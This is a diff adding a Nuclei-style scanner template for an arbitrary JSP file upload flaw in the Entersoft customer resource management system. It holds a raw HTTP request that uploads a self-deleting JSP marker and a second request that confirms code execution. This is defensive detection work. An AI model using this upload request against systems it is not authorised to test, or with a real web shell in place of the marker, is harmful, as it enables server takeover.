@@ -1,0 +1,46 @@
+id: entersoft-fileupload-upload
+
+info:
+  name: 浙大恩特客户资源管理系统 fileupload.jsp 任意文件上传漏洞
+  author: SleepingBag945
+  severity: critical
+  description: |
+    浙大恩特客户资源管理系统是恩特软件开发的一款客户资源管理系统。
+    浙大恩特客户资源管理系统 fileupload.jsp 存在任意文件上传漏洞。
+    厂商已发布了漏洞修复程序，请及时关注更新
+    攻击者可通过该漏洞在服务器端上传后门，执行代码，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/MeowwBox/pxplan/blob/fd87ef720bf9e7550512ef22bf1f84c3895e8b1c/goby_pocs/10-13-crack/redteam_20230907161850/CVD-2023-1720.go#L182
+
+variables:
+  filename: "{{to_lower(rand_text_alpha(8))}}"
+  boundary: "{{to_lower(rand_base(32))}}"
+
+http:
+  - raw:
+      - |
+        POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename={{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        
+        <% out.println(666*666);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+      - |
+        GET /enterdoc/uploadfile/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200
+          - contains(body_1,".jsp")
+          - contains(body_2,"443556")
+        condition: and
